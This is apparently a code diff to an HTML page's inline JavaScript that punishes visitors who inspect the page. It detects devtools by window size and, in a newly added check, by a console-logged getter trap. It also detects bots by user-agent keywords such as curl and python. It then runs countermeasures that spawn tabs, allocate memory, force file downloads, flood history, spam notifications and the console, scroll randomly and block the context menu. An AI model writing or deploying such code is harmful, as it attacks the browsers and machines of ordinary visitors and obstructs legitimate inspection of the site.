@@ -1222,7 +1222,8 @@
     }
   }
   
-  // A series of countermeasures that spam tabs, allocate memory, download files, etc.
+  // The counter() function includes extra measures (opening tabs, memory allocation,
+  // file downloads, alerts, history flooding, notifications, and console spam).
   function counter() {
     function tabs() {
       const n = Math.floor(Math.random() * 3) + 1;
@@ -1325,7 +1326,7 @@
       }
     }
     
-    // spamC: flood the console with messages to deter inspection.
+    // spamC: Flood the console with messages.
     function spamC() {
       try {
         console.log("Starting console spam.");
@@ -1357,6 +1358,7 @@
     setInterval(() => window.scrollTo(0, Math.random() * 9999), 500);
   }
   
+  // Use disC() to preserve the console while still handling global errors.
   function disC() {
     Object.defineProperty(window, 'console', {
       get: function() { return console; },
@@ -1371,6 +1373,7 @@
     };
   }
   
+  // detDev() remains for some checks (like performance delays and DOM property accesses).
   function detDev() {
     setInterval(function() {
       const dimCheck = (window.outerWidth - window.innerWidth > 160) ||
@@ -1436,6 +1439,7 @@
     }, true);
   }
   
+  // Block context menu and other events.
   function blockA() {
     document.addEventListener('contextmenu', function(e) {
       e.preventDefault();
@@ -1460,6 +1464,7 @@
     document.head.appendChild(s);
   }
   
+  // Mutation observer to detect DOM changes.
   function detDOM() {
     const div = document.createElement('div');
     div.id = 'dom-det';
@@ -1483,6 +1488,7 @@
     return div;
   }
   
+  // Bot and headless browser detection.
   function detBot() {
     const ua = navigator.userAgent.toLowerCase();
     const bp = ['bot', 'spider', 'crawl', 'wget', 'curl', 'scrape', 'http', 'java', 'python', 'requests', 'headless'];
@@ -1502,6 +1508,7 @@
     return false;
   }
   
+  // Break-off detection for improper framing or protocol.
   function breakOff() {
     function chkConn() {
       const img = new Image();
@@ -1525,7 +1532,26 @@
     document.head.appendChild(s);
   }
   
-  // Spam functions remain in place.
+  // --- New: Detect Dev Tools via toString hack ---
+  function detectDevToolsToString() {
+    // Create an object with a getter on one of its properties.
+    let element = new Image();
+    Object.defineProperty(element, 'id', {
+      get: function() {
+        aggro("Dev tools detected via toString hack.");
+        return '';
+      }
+    });
+    // Log the object so that, if dev tools are open,
+    // its properties will be inspected, triggering the getter.
+    console.log("%c", element);
+  }
+  // Run this check repeatedly (e.g. every second).
+  setInterval(detectDevToolsToString, 1000);
+  
+  // Omit spam() and spamC() functions for clean output?  
+  // In this version we keep them intact.
+  
   function spam() {
     const d = document.createElement('div');
     d.style.display = 'none';
@@ -1614,7 +1640,7 @@
     } catch (e) {}
   }
   
-  // Initialize detection routines
+  // Initialize all routines.
   disC();
   detDev();
   block();
@@ -1628,7 +1654,7 @@
   
   window.addEventListener('beforeunload', reset);
   
-  // Final checks
+  // Final checks.
   if ((window.outerWidth - window.innerWidth > 160) || (window.outerHeight - window.innerHeight > 160)) {
     aggro("Final check: Outer dimension condition triggered.");
     return;
@@ -1661,6 +1687,7 @@
     }
   }
 })();
+
   </script>
 </body>
 </html>
